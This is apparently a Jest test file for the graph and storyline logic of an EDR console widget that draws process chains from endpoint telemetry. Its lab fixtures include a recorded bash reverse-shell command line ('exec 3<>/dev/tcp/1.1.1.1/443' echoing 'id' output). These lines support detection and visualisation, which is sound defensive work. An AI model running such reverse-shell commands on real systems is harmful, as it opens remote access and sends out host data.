"use strict";
// Pure-logic tests for the node-graph model (widget/widgetAssets/js/timelineGraph.js).
// No DOM, no cytoscape -- just stacks -> graph -> element JSON -> layout.
// The two fixture chains are the live-proven shapes:
//   - the bash chain (9 nodes + an internet host: one line, systemd ->
//     reverse shell -> 1.1.1.1, AS 13335 CLOUDFLARENET);
//   - the Windows control.exe chain (multi-stage merge, self-edge, dangling aux).
// Run with: make test-unit WIDGET=fortiedrCommandTimeline
const g = require("../widget/widgetAssets/js/timelineGraph.js");

// One stage as the console's rdi-events answer carries it.
function rawStage(over) {
  return Object.assign({
    stageName: "PARENT PROCESS CREATION",
    shortSourceProcessName: "sudo",
    sourceProcessPath: "/usr/bin/sudo",
    sourceProcessOwner: null,
    destinationProcessPath: "",
    is64Bit: true,
    certificateStatus: "Unsigned",
    processId: "5302",
    auxProcessId: "5304",
    timestamp: 1793725330000,
    commandLine: "",
    stackNum: 3,
    stackEntries: [],
  }, over || {});
}

// The live bash chain, in the console's own (unordered) stage order. The
// last stage is the CONNECTION STACK: the reverse shell reached the
// event's destination, so the graph anchors the internet host there.
function bashChain() {
  return [
    rawStage({ processId: "5302", auxProcessId: "5304", shortSourceProcessName: "sudo",
               commandLine: "bash /tmp/edr_lab.sh all", timestamp: 1793725332000 }),
    rawStage({ processId: "5301", auxProcessId: "5302", shortSourceProcessName: "bash",
               commandLine: "-c sudo bash /tmp/edr_lab.sh all 2>&1 | tail", timestamp: 1793725331000 }),
    rawStage({ processId: "5345", auxProcessId: "5346", shortSourceProcessName: "timeout",
               commandLine: "6 bash -c exec 3<>/dev/tcp/1.1.1.1/443", timestamp: 1793725334000 }),
    rawStage({ processId: "5304", auxProcessId: "5345", shortSourceProcessName: "bash",
               commandLine: "/tmp/edr_lab.sh all", timestamp: 1793725333000 }),
    rawStage({ processId: "5225", auxProcessId: "5300", shortSourceProcessName: "sshd",
               commandLine: "-D -R", timestamp: 1793725329000 }),
    rawStage({ processId: "1", auxProcessId: "1064", shortSourceProcessName: "systemd",
               commandLine: "", timestamp: 1793725327000 }),
    rawStage({ processId: "1064", auxProcessId: "5225", shortSourceProcessName: "sshd",
               commandLine: "", timestamp: 1793725328000 }),
    rawStage({ processId: "5300", auxProcessId: "5301", shortSourceProcessName: "sshd",
               commandLine: "-D -R", timestamp: 1793725330000 }),
    rawStage({ stageName: "CONNECTION STACK", processId: "5346", auxProcessId: null,
               shortSourceProcessName: "bash",
               commandLine: '-c exec 3<>/dev/tcp/1.1.1.1/443 && { echo "id=$(id)', timestamp: 1793725335000 }),
  ];
}

// The live event-level network triple (destination/asn/country), as the
// connector's whitelist stores it.
function bashTimeline(over) {
  return Object.assign({
    eventId: 694297391,
    host: "lab-endpoint-01",
    os: "Ubuntu 24.04.4 LTS",
    destination: "1.1.1.1",
    remoteIP: "1.1.1.1",
    asn: "13335 CLOUDFLARENET",
    country: "US",
    stacks: bashChain(),
  }, over || {});
}

// The live Windows chain: 8 clean spawn stages, then control.exe (pid 4392)
// appears in three more stages -- a self thread-creation, an open-process on
// a pid the chain never kept (4), and a credentials access on another (684).
// No CONNECTION stage: its event carries no reachable internet anchor.
// Sensor-relative stamps (~4.1e9) that are NOT plausible epochs.
function controlChain() {
  return [
    rawStage({ processId: "3328", auxProcessId: "6824", shortSourceProcessName: "userinit.exe", timestamp: 4054092603 }),
    rawStage({ processId: "6824", auxProcessId: "8156", shortSourceProcessName: "explorer.exe", timestamp: 4054092611 }),
    rawStage({ processId: "8156", auxProcessId: "6000", shortSourceProcessName: "OneDrive.exe",
               commandLine: "/background", timestamp: 4054092619 }),
    rawStage({ processId: "6000", auxProcessId: "6172", shortSourceProcessName: "OneDriveSetup.exe",
               commandLine: "/update /restart /updateSource:ODU", timestamp: 4054092800 }),
    rawStage({ processId: "6172", auxProcessId: "1252", shortSourceProcessName: "OneDriveSetup.exe",
               commandLine: "/update /restart /updateSource:ODU  /per", timestamp: 4054092900 }),
    rawStage({ processId: "1252", auxProcessId: "5544", shortSourceProcessName: "OneDrive.exe",
               commandLine: "/updateInstalled /background", timestamp: 4054093000 }),
    rawStage({ processId: "5544", auxProcessId: "492", shortSourceProcessName: "explorer.exe", timestamp: 4054093100 }),
    rawStage({ processId: "492", auxProcessId: "4392", shortSourceProcessName: "Windows_Update.exe", timestamp: 4054093200 }),
    rawStage({ stageName: "THREAD CREATION STACK", processId: "4392", auxProcessId: "4392",
               shortSourceProcessName: "control.exe", timestamp: 4054093300 }),
    rawStage({ stageName: "OPEN PROCESS STACK", processId: "4392", auxProcessId: "4",
               shortSourceProcessName: "control.exe", timestamp: 4054093400 }),
    rawStage({ stageName: "CREDENTIALS ACCESS", processId: "4392", auxProcessId: "684",
               shortSourceProcessName: "control.exe", timestamp: 4054093500 }),
  ];
}

function nodeFor(graph, id) {
  return graph.nodes.find((n) => n.id === id);
}

// toGraph takes the TIMELINE object (what extractTimeline returns), not the
// bare stacks array -- the same contract buildStages has.
const bashGraph = () => g.toGraph(bashTimeline());
const controlGraph = () => g.toGraph({ stacks: controlChain() });

describe("toGraph -- the live bash chain", () => {
  const graph = bashGraph();

  test("one node per unique processId, plus the internet host: 9 + 1", () => {
    expect(graph.nodes.length).toBe(10);
    expect(graph.nodes.slice(0, 9).map((n) => n.pid)).toEqual(
      ["1", "1064", "5225", "5300", "5301", "5302", "5304", "5345", "5346"]);
    expect(graph.nodes[9].id).toBe("net:1.1.1.1");
  });

  test("the spawn chain is a single line systemd -> reverse shell -> internet", () => {
    expect(graph.edges).toEqual([
      { source: "1", target: "1064", net: false },
      { source: "1064", target: "5225", net: false },
      { source: "5225", target: "5300", net: false },
      { source: "5300", target: "5301", net: false },
      { source: "5301", target: "5302", net: false },
      { source: "5302", target: "5304", net: false },
      { source: "5304", target: "5345", net: false },
      { source: "5345", target: "5346", net: false },
      { source: "5346", target: "net:1.1.1.1", net: true },
    ]);
  });

  test("systemd (pid 1) is the only root, first in root order", () => {
    expect(graph.roots).toEqual(["1"]);
  });

  test("the internet host carries the API's own network facts", () => {
    const net = nodeFor(graph, "net:1.1.1.1");
    expect(net.net).toEqual({
      ip: "1.1.1.1", asn: "13335 CLOUDFLARENET", country: "US",
      remoteUrl: "", action: "",
    });
    expect(net.activity).toBe(false);
    expect(net.stages.length).toBe(1);
    expect(net.stages[0].pid).toBe("5346");
    expect(net.stages[0].command).toContain("/dev/tcp/1.1.1.1/443");
  });

  test("the event's action lands on the net card when the record carries one", () => {
    const graph2 = g.toGraph(bashTimeline(), { action: "Block" });
    const net = nodeFor(graph2, "net:1.1.1.1");
    expect(net.net.action).toBe("Block");
    expect(net.name).toBe("Internet host (Block)");
  });

  test("the reverse-shell node keeps its command and its activity stage", () => {
    const shell = nodeFor(graph, "5346");
    expect(shell.activity).toBe(true);
    expect(shell.kinds).toEqual(["CONNECTION STACK"]);
    expect(shell.stages.length).toBe(1);
    expect(shell.command).toContain("/dev/tcp/1.1.1.1/443");
  });
});

describe("toGraph -- the live control.exe chain", () => {
  const graph = controlGraph();

  test("multi-stage processes merge onto ONE node keeping all stages", () => {
    const control = nodeFor(graph, "4392");
    expect(control).toBeDefined();
    expect(control.name).toBe("control.exe");
    expect(control.stages.length).toBe(3);
    // Chronological stage order inside the merged node.
    expect(control.stages.map((s) => s.stage)).toEqual(
      ["THREAD CREATION STACK", "OPEN PROCESS STACK", "CREDENTIALS ACCESS"]);
    expect(control.kinds).toEqual(
      ["THREAD CREATION STACK", "OPEN PROCESS STACK", "CREDENTIALS ACCESS"]);
  });

  test("self-edges are dropped; the chain's own spawn edge survives", () => {
    const selfEdge = graph.edges.find((e) => e.source === "4392" && e.target === "4392");
    expect(selfEdge).toBeUndefined();
    // The 8 spawn edges, exactly -- including 492 -> 4392 (Windows_Update.exe
    // spawned control.exe), and NO out-edges from control.exe (its aux pids
    // were its own thread, pid 4, and pid 684 -- none of them chain stages).
    expect(graph.edges).toEqual([
      { source: "3328", target: "6824", net: false },
      { source: "6824", target: "8156", net: false },
      { source: "8156", target: "6000", net: false },
      { source: "6000", target: "6172", net: false },
      { source: "6172", target: "1252", net: false },
      { source: "1252", target: "5544", net: false },
      { source: "5544", target: "492", net: false },
      { source: "492", target: "4392", net: false },
    ]);
  });

  test("dangling aux targets produce no edge", () => {
    const to4 = graph.edges.find((e) => e.target === "4");
    const to684 = graph.edges.find((e) => e.target === "684");
    expect(to4).toBeUndefined();
    expect(to684).toBeUndefined();
    expect(graph.nodes.find((n) => n.pid === "4")).toBeUndefined();
  });

  test("the merged activity node is flagged activity, ancestry stages are not", () => {
    expect(nodeFor(graph, "4392").activity).toBe(true);
    expect(nodeFor(graph, "3328").activity).toBe(false);
    expect(nodeFor(graph, "492").activity).toBe(false);
  });

  test("userinit.exe is the single root", () => {
    expect(graph.roots).toEqual(["3328"]);
  });
});

describe("toGraph -- when the internet host must NOT appear", () => {
  test("no destination in the event -> no net node", () => {
    const graph = g.toGraph(bashTimeline({ destination: undefined, remoteIP: undefined }));
    expect(graph.nodes.find((n) => n.net)).toBeUndefined();
    expect(graph.edges.every((e) => !e.net)).toBe(true);
  });

  test("destination but NO connection stage -> no net node (an unanchorable edge would be a guess)", () => {
    // The control.exe chain + a destination: nothing reached out per the
    // stacks, so the header carries the destination alone.
    const graph = g.toGraph({ stacks: controlChain(), destination: "1.1.1.1",
                              remoteIP: "1.1.1.1", asn: "13335 CLOUDFLARENET" });
    expect(graph.nodes.find((n) => n.net)).toBeUndefined();
  });

  test("remoteIP alone (no destination key) still anchors the net node", () => {
    const graph = g.toGraph(bashTimeline({ destination: undefined }));
    expect(graph.nodes.find((n) => n.net)).toBeDefined();
  });
});

describe("toGraph -- structural rules", () => {
  test("duplicate edges dedupe (two stages of one parent spawning the same child)", () => {
    // The child must exist as its own stage, or its edge is dangling by rule.
    const stacks = [
      rawStage({ processId: "100", auxProcessId: "200", stageName: "PARENT PROCESS CREATION" }),
      rawStage({ processId: "100", auxProcessId: "200", stageName: "PROCESS CREATION" }),
      rawStage({ processId: "200", auxProcessId: null, stageName: "PROCESS ACTIVITY",
                 shortSourceProcessName: "child" }),
    ];
    const graph = g.toGraph({ stacks });
    expect(graph.edges).toEqual([{ source: "100", target: "200", net: false }]);
    expect(graph.nodes.length).toBe(2);
  });

  test("a pid-less stage stands alone on its own node", () => {
    const stacks = [
      rawStage({ processId: null, auxProcessId: null, shortSourceProcessName: "orphan.exe" }),
    ];
    const graph = g.toGraph({ stacks });
    expect(graph.nodes.length).toBe(1);
    expect(graph.nodes[0].id).toBe("stage-0");
    expect(graph.nodes[0].name).toBe("orphan.exe");
    expect(graph.edges).toEqual([]);
    expect(graph.roots).toEqual(["stage-0"]);
  });

  test("an empty stacks list yields an empty graph", () => {
    const graph = g.toGraph({ stacks: [] });
    expect(graph.nodes).toEqual([]);
    expect(graph.edges).toEqual([]);
    expect(graph.roots).toEqual([]);
  });

  test("isActivity: only ancestry stage names are neutral; unknown names are activity", () => {
    expect(g.isActivity("PARENT PROCESS CREATION")).toBe(false);
    expect(g.isActivity("PROCESS CREATION")).toBe(false);
    expect(g.isActivity("process creation ")).toBe(false);  // case/space tolerant
    expect(g.isActivity("THREAD CREATION STACK")).toBe(true);
    expect(g.isActivity("CREDENTIALS ACCESS")).toBe(true);
    expect(g.isActivity("SOMETHING NEVER SEEN")).toBe(true);
    expect(g.isActivity(undefined)).toBe(true);
  });
});

describe("cardLabel / kindText -- what the canvas card says", () => {
  test("ancestry cards stay two short lines (name, PID) -- no kind noise", () => {
    const els = g.toElements(bashGraph());
    const systemd = els.nodes.find((n) => n.data.id === "1");
    expect(systemd.data.label).toBe("systemd\nPID 1");
  });

  test("a command-bearing ancestry card stays two lines: commands live in the story", () => {
    const els = g.toElements(bashGraph());
    const sshd = els.nodes.find((n) => n.data.id === "5225");
    expect(sshd.data.label).toBe("sshd\nPID 5225");
  });

  test("an activity card names what it did, without the command", () => {
    const els = g.toElements(bashGraph());
    const shell = els.nodes.find((n) => n.data.id === "5346");
    expect(shell.data.label).toBe("bash\nPID 5346\nCONNECTION STACK");
    expect(shell.data.label).not.toContain("/dev/tcp");
  });

  test("a merged node summarizes its kinds: first kind + count", () => {
    const els = g.toElements(controlGraph());
    const control = els.nodes.find((n) => n.data.id === "4392");
    expect(control.data.label).toBe("control.exe\nPID 4392\nTHREAD CREATION STACK +2");
  });

  test("long kinds ellipsize with ASCII dots (no en/em dashes)", () => {
    const label = g.cardLabel({ name: "x".repeat(60), pid: "9", kinds: ["K".repeat(80)],
                                command: "ignored", activity: true, net: null });
    const lines = label.split("\n");
    expect(lines[0].endsWith("...")).toBe(true);
    expect(lines[2].endsWith("...")).toBe(true);
    expect(label).not.toContain("ignored");
  });

  test("kindText: ancestry-only -> empty; activity -> first kind; merged -> +N", () => {
    expect(g.kindText({ kinds: ["PARENT PROCESS CREATION"], net: null })).toBe("");
    expect(g.kindText({ kinds: ["CONNECTION STACK"], net: null })).toBe("CONNECTION STACK");
    expect(g.kindText({ kinds: ["THREAD CREATION STACK", "OPEN PROCESS STACK", "CREDENTIALS ACCESS"],
                        net: null })).toBe("THREAD CREATION STACK +2");
  });
});

describe("toElements", () => {
  test("node data carries id/label/name/pid/border color/net/activity/counts", () => {
    const els = g.toElements(bashGraph());
    const shell = els.nodes.find((n) => n.data.id === "5346");
    expect(shell.data).toMatchObject({
      id: "5346", name: "bash", pid: "5346",
      color: g.COLORS.ACTIVITY_BORDER, net: false, activity: true,
      kindCount: 1, stageCount: 1,
    });
    const net = els.nodes.find((n) => n.data.id === "net:1.1.1.1");
    expect(net.data.color).toBe(g.COLORS.NET_BORDER);
    expect(net.data.net).toBe(true);
    const systemd = els.nodes.find((n) => n.data.id === "1");
    expect(systemd.data.color).toBe(g.COLORS.ANCESTRY_BORDER);
  });

  test("the net edge is flagged for the dashed style", () => {
    const els = g.toElements(bashGraph());
    expect(els.edges.length).toBe(9);
    expect(els.edges[8]).toEqual({
      data: { id: "e8", source: "5346", target: "net:1.1.1.1", net: true,
              color: g.COLORS.NET_BORDER },
    });
  });
});

describe("graphStyle", () => {
  test("one dark fill, meaning on the border; net edges dashed", () => {
    const style = g.graphStyle();
    const node = style.find((s) => s.selector === "node");
    expect(node.style["background-color"]).toBe(g.COLORS.FILL);
    expect(node.style["border-color"]).toBe("data(color)");
    expect(node.style.width).toBe(g.CARD_W);
    const netEdge = style.find((s) => s.selector === "edge[net]");
    expect(netEdge.style["line-style"]).toBe("dashed");
  });
});

describe("snakeLayout -- linear chains wrap into readable rows", () => {
  test("a 9-card chain in a wide viewport: two boustrophedon rows at zoom 1", () => {
    const layout = g.snakeLayout(bashGraph(), { width: 1469, height: 338 });
    expect(layout.name).toBe("preset");
    expect(layout.fit).toBe(false);   // never upscale a short chain
    const pos = layout.positions;
    // 10 nodes: 5 per row. Row 0 left->right, row 1 snakes right->left.
    expect(Object.keys(pos).length).toBe(10);
    expect(pos["1"].y).toBe(pos["1064"].y);              // row 0
    expect(pos["5346"].y).toBe(pos["net:1.1.1.1"].y);    // row 1
    expect(pos["1"].y).toBeLessThan(pos["5346"].y);
    expect(pos["1"].x).toBeLessThan(pos["1064"].x);      // left -> right
    // The snake turn: last of row 0 (bash 5301) and first of row 1 (sudo
    // 5302) sit in the SAME column, so the wrap edge drops straight down.
    expect(pos["5301"].x).toBe(pos["5302"].x);
    // Row 1 runs right -> left: chain order goes leftward on x.
    expect(pos["5302"].x).toBeGreaterThan(pos["5304"].x);
    expect(pos["5346"].x).toBeGreaterThan(pos["net:1.1.1.1"].x);
  });

  test("a 3-card chain fits one row", () => {
    const three = g.toGraph({ stacks: [
      rawStage({ processId: "10", auxProcessId: "20" }),
      rawStage({ processId: "20", auxProcessId: "30" }),
      rawStage({ processId: "30", auxProcessId: null, stageName: "PROCESS ACTIVITY" }),
    ] });
    const layout = g.snakeLayout(three, { width: 1469, height: 338 });
    expect(layout.name).toBe("preset");
    const ys = Object.values(layout.positions).map((p) => p.y);
    expect(new Set(ys).size).toBe(1);
  });

  test("a branched graph is not a snake: dagre fallback", () => {
    // Two children off one parent -> out-degree 2.
    const stacks = [
      rawStage({ processId: "100", auxProcessId: "200", shortSourceProcessName: "parent" }),
      rawStage({ processId: "200", auxProcessId: null, shortSourceProcessName: "kidA" }),
      rawStage({ processId: "100", auxProcessId: "300", stageName: "PROCESS ACTIVITY",
                 shortSourceProcessName: "parent" }),
      rawStage({ processId: "300", auxProcessId: null, stageName: "PROCESS ACTIVITY",
                 shortSourceProcessName: "kidB" }),
    ];
    const graph = g.toGraph({ stacks });
    expect(g.snakeLayout(graph, { width: 1469, height: 338 })).toBeNull();
    expect(g.graphLayout(graph, { width: 1469, height: 338 })).toMatchObject({
      name: "dagre", rankDir: "LR",
    });
  });

  test("no measurable viewport yet -> dagre (the pre-attach case)", () => {
    expect(g.graphLayout(bashGraph(), { width: 0, height: 0 }))
      .toMatchObject({ name: "dagre" });
    expect(g.snakeLayout(bashGraph(), null)).toBeNull();
  });
});

// ---- storyline (the default view) -----------------------------------------
describe("toStory", () => {
  const story = () => g.toStory(g.toGraph(bashTimeline(), { action: "Block" }));

  test("walks the chain root to internet host with per-step deltas", () => {
    const s = story();
    expect(s.steps.map((x) => x.node.name)).toEqual(
      ["systemd", "sshd", "sshd", "sshd", "bash", "sudo", "bash", "timeout", "bash", "Internet host (Block)"]);
    expect(s.steps.map((x) => x.role)).toEqual(
      ["ancestry", "ancestry", "ancestry", "ancestry", "ancestry", "ancestry", "ancestry", "ancestry", "activity", "net"]);
    expect(s.steps[0].delta).toBe("");           // nothing before the root
    expect(s.steps[1].delta).toBe("+1s");
    expect(s.stats).toMatchObject({ processes: 9, activity: 1, branched: false, hasNet: true, spanText: "8s" });
  });

  test("folds the leading ancestry run but keeps the last two parents", () => {
    const s = story();
    // 8 plain-ancestry steps lead the chain; the last two stay as full cards.
    expect(s.lead.length).toBe(6);
    expect(s.steps.slice(s.lead.length)[0].node.name).toBe("bash");
  });

  test("a short chain folds nothing", () => {
    const t = bashTimeline({ stacks: bashChain().slice(0, 2) });
    expect(g.toStory(g.toGraph(t)).lead).toEqual([]);
  });

  test("the narrative names only stored facts", () => {
    expect(story().narrative).toBe(
      "systemd (PID 1) started a chain of 9 processes ending in bash (PID 5346), " +
      "which connected to 1.1.1.1 (AS 13335 CLOUDFLARENET).");
  });

  test("tokenizes socket paths, IPs and temp paths; nothing else is marked", () => {
    const t = g.tokenizeCommand("-c exec 3<>/dev/tcp/1.1.1.1/443 && bash /tmp/edr_lab.sh");
    expect(t.filter((x) => x.k).map((x) => [x.k, x.t])).toEqual(
      [["sock", "/dev/tcp/1.1.1.1/443"], ["tmp", "/tmp/edr_lab.sh"]]);
    expect(t.map((x) => x.t).join("")).toBe("-c exec 3<>/dev/tcp/1.1.1.1/443 && bash /tmp/edr_lab.sh");
    expect(g.tokenizeCommand("ping 10.0.0.5:8080").filter((x) => x.k)).toEqual(
      [{ t: "10.0.0.5:8080", k: "ip" }]);
    expect(g.tokenizeCommand("")).toEqual([]);
  });

  test("signals are factual call-outs", () => {
    const s = story();
    const by = (name, pid) => s.steps.find((x) => x.node.name === name && x.node.pid === pid);
    expect(by("sudo", "5302").signals).toEqual(["Runs from a temporary location", "Privilege elevation"]);
    expect(by("bash", "5346").signals).toEqual(["Opens a network socket from a shell"]);
    expect(by("sshd", "1064").signals).toEqual([]);
  });

  test("indent flag: a branched graph reports branched", () => {
    const t = bashTimeline({ stacks: bashChain().concat([
      rawStage({ processId: "5304", auxProcessId: "9999", shortSourceProcessName: "bash", timestamp: 1793725336000 }),
      rawStage({ processId: "9999", auxProcessId: null, shortSourceProcessName: "curl", timestamp: 1793725337000 }),
    ]) });
    expect(g.toStory(g.toGraph(t)).stats.branched).toBe(true);
  });

  test("icons follow the process kind", () => {
    const s = story();
    expect(s.steps.map((x) => x.icon)).toEqual(
      ["cube", "key", "key", "key", "terminal", "shield", "terminal", "cube", "terminal", "globe"]);
  });
});

describe("graph polish", () => {
  test("nodes carry a role class and an icon; edges into activity are red", () => {
    const els = g.toElements(bashGraph());
    const shell = els.nodes.find((n) => n.data.id === "5346");
    expect(shell.classes).toBe("activity");
    expect(shell.data.icon).toMatch(/^data:image\/svg\+xml/);
    const into = els.edges.find((e) => e.data.target === "5346");
    expect(into.data.color).toBe(g.COLORS.ACTIVITY_BORDER);
    const plain = els.edges.find((e) => e.data.target === "5304");
    expect(plain.data.color).toBe(g.COLORS.EDGE_COLOR);
  });

  test("foldLead replaces the leading ancestry with one node and keeps the rest wired", () => {
    const graph = bashGraph();
    const story = g.toStory(graph);
    const folded = g.foldLead(graph, story);
    expect(story.lead.length).toBe(6);
    expect(folded.nodes.length).toBe(graph.nodes.length - 6 + 1);
    expect(folded.nodes[0]).toMatchObject({ id: "fold", fold: true });
    expect(folded.nodes[0].label).toMatch(/^6 earlier processes\n/);
    // One edge from the fold into the first visible process; none inside the run.
    const out = folded.edges.filter((e) => e.source === "fold");
    expect(out.length).toBe(1);
    const ids = folded.nodes.map((n) => n.id);
    folded.edges.forEach((e) => { expect(ids).toContain(e.source); expect(ids).toContain(e.target); });
    // The input graph is not mutated.
    expect(graph.nodes.length).toBe(10);
  });

  test("a short chain folds nothing and returns the same graph", () => {
    const graph = g.toGraph(bashTimeline({ stacks: bashChain().slice(0, 2) }));
    expect(g.foldLead(graph, g.toStory(graph))).toBe(graph);
  });

  test("the fold node renders as a dashed card", () => {
    const graph = bashGraph();
    const els = g.toElements(g.foldLead(graph, g.toStory(graph)));
    const fold = els.nodes.find((n) => n.data.id === "fold");
    expect(fold.classes).toBe("fold");
    expect(g.graphStyle().find((s) => s.selector === "node.fold").style["border-style"]).toBe("dashed");
  });
});
